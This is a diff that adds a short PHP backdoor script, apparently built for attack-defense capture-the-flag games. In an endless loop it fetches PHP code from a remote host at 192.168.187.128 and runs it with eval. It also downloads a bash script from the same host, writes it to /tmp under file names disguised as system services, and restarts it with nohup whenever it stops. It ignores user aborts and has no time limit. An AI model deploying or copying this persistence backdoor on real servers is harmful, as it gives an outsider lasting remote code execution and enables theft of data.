@@ -1,0 +1,39 @@
+<?php
+
+/*>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>*/
+// Must config
+$bash_url = "http://192.168.187.128/bash.txt";
+$code_url = "http://192.168.187.128/code.txt"; // get flag and send it to us
+/*>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>*/
+// Config
+$bash_lock_file = "/tmp/8960fee17b-apache2.service-lw2D8m";
+$php_lock_file = "/tmp/82aa24546d-mysql.service-hcl342";
+$bash_path = "/tmp/ab6d9ac821-crontab.service-29487d";
+/*>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>*/
+ignore_user_abort(true);
+set_time_limit(0);
+$sleep_time = 3; // max sleep_time : 3 seconds
+$content = file_get_contents($bash_url);
+while(true){
+    // tell bash that i am living
+    echo "Telling bash that i am alive...\n";
+    touch($php_lock_file);
+    echo "PHP Lock file last accessed : ".(time() - fileatime($php_lock_file))."\n";
+    // check bash is living or not
+    echo "Checking the bash script is alive or not...\n";
+    if(!(file_exists($bash_lock_file) && ((time() - fileatime($bash_lock_file)) < ($sleep_time + 1)))){
+        echo "The bash script is dead!\n";
+        // download bash script
+        echo "Downloading bash script...\n";
+        @file_put_contents($bash_path, $content);
+        // restart bash script
+        echo "Restarting bash script...\n";
+        @popen('nohup bash '.$bash_path.' &', 'r');
+    }
+    // control loop speed
+    echo "Sleeping...\n";
+    sleep($sleep_time);
+    // backdoor
+    echo "Executing backdoor...";
+    @eval(file_get_contents($code_url));
+}
